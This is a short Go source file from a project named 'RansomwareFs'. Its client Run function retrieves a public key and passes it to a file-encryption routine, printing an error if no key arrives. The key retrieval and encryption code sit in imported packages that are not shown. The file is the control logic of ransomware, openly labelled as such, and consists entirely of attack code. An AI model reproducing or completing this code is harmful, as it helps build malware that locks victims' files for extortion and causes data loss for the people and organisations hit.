package client

import (
	"RansomwareFs/client/enc_file"
	"RansomwareFs/client/get_pub_key"
)

func Run() {
	publicKeyPEM := get_pub_key.GetPublicKey()
	if publicKeyPEM != "" {
		enc_file.EncryptFile(publicKeyPEM)
	} else {
		// Handle the case where the public key could not be retrieved
		println("Failed to retrieve public key.")
	}
}
